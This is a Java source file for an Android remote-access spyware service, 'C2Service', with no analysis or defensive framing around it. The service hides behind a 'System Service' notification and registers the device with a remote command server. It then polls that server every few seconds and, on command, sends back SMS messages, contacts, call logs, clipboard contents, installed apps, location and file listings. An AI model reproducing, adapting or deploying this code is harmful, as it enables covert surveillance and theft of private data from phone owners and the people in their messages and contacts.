package com.vanta.core;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Service extends Service {
    private volatile boolean run = true;
    private String uuid;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        uuid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("c2", "Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            startForeground(1, new Notification.Builder(this, "c2")
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
        } else {
            startForeground(1, new Notification.Builder(this)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
        }

        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }

    private void loop() {
        register();
        while (run) {
            try {
                String body = http("GET", "/cmd?uuid=" + uuid, null);
                String cmd = extract(body);
                if (cmd != null && cmd.length() > 0 && !cmd.equals("null")) send(exec(cmd));
            } catch (Exception e) {}
            try { Thread.sleep(4000); } catch (Exception e) {}
        }
    }

    private void register() {
        try {
            http("POST", "/register",
                "{\"uuid\":\"" + uuid + "\",\"model\":\"" + Build.MODEL + "\"}");
        } catch (Exception e) {}
    }

    private void send(String text) {
        try {
            String safe = text.replace("\\", "\\\\").replace("\"", "\\\"")
                              .replace("\n", "\\n").replace("\r", "");
            http("POST", "/result",
                "{\"uuid\":\"" + uuid + "\",\"text\":\"" + safe + "\"}");
        } catch (Exception e) {}
    }

    private String http(String method, String path, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(Config.SERVER + path).openConnection();
            c.setRequestMethod(method);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            if (body != null) {
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/json");
                OutputStream os = c.getOutputStream();
                os.write(body.getBytes("UTF-8"));
                os.close();
            }
            InputStream in = c.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int r;
            while ((r = in.read(buf)) > 0) bo.write(buf, 0, r);
            in.close();
            return bo.toString("UTF-8");
        } catch (Exception e) { return "{}"; }
    }

    private String extract(String json) {
        int i = json.indexOf("\"cmd\"");
        if (i < 0) return null;
        int s = json.indexOf('"', json.indexOf(':', i) + 1);
        int e = json.indexOf('"', s + 1);
        if (s < 0 || e < 0) return null;
        return json.substring(s + 1, e);
    }

    private String exec(String cmd) {
        try {
            if (cmd.equals("all-sms")) return sms();
            if (cmd.equals("all-contacts")) return contacts();
            if (cmd.equals("calls")) return calls();
            if (cmd.equals("clipboard")) return clip();
            if (cmd.equals("apps")) return apps();
            if (cmd.equals("location")) return loc();
            if (cmd.equals("files")) return files();
            if (cmd.equals("vibrate")) {
                Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null) v.vibrate(1500);
                return "vibrated";
            }
            return "unknown:" + cmd;
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    private String sms() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 50)
                sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
            c.close();
        }
        return sb.toString();
    }

    private String contacts() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 50)
                sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            c.close();
        }
        return sb.toString();
    }

    private String calls() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 30)
                sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
            c.close();
        }
        return sb.toString();
    }

    private String clip() {
        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cb.getPrimaryClip() != null && cb.getPrimaryClip().getItemCount() > 0)
            return String.valueOf(cb.getPrimaryClip().getItemAt(0).getText());
        return "empty";
    }

    private String apps() {
        StringBuilder sb = new StringBuilder();
        for (android.content.pm.ApplicationInfo a : getPackageManager().getInstalledApplications(0))
            sb.append(a.packageName).append("\n");
        return sb.toString();
    }

    private String loc() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return l == null ? "no-location" : l.getLatitude() + "," + l.getLongitude();
        } catch (Exception e) { return "loc-err"; }
    }

    private String files() {
        StringBuilder sb = new StringBuilder();
        File[] fs = Environment.getExternalStorageDirectory().listFiles();
        if (fs != null) for (File f : fs) sb.append(f.getName()).append("\n");
        return sb.toString();
    }

    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { run = false; super.onDestroy(); }
              }
